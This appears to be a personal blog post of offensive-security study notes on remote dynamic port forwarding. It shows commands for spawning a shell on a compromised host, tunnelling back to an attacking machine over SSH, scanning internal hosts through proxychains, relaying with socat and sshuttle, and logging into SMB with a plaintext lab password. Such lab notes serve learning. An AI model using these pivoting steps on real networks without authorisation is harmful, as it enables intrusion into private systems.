---
layout: post
title: Remote Dynamic Port Forwarding
titledate: 09/23/23
tags: ["infosec", "offsec", "tunnel", "socat", "sshuttle"]
---

remote dynamic port forwarding works similar to local in that we want to forward traffic to multiple clients from one session and we can do this in a remote port forwarding instance in which we can setup the session from the target1

if we have a target1 that allows outbound ssh but not inbound we can perform RDPF

again we setup the tty shell session with python pty

    $ python3 -c 'import pty; pty.spawn("/bin/bash")'

next we create the ssh session from target1 to the port we want to access

    $ ssh -N -R 9998 kali@192.168.118.4

here we specify no shell and -R for remote forwarding to our attacking machine and the listening port on the attacking machine

we can check this port is bound and listening on our local interface

    $ sudo ss -ntplu

now like in the previous dynamic port forwarding example we can use proxychains to to send traffic over the socks proxy 

    $ tail /etc/proxychains4.conf

    - socks5 127.0.0.1 9998 (or port we are trying to access)

and to illustrate the example we us proxychains to run nmap against one of the servers

    $ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.1.1

if we have root privs and python3 installed sshuttle may be a viable option

    target1: socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22

here we setup socat listening on 2222 forwarding ssh to the psql db target

    $ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24

and then in our attacking machine we specify the psql db connection as well as the subnets we want to tunnel 

now this will behave like a vpn environment - any connection we make to hosts on the subnet should have seemingly direct access

    $ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
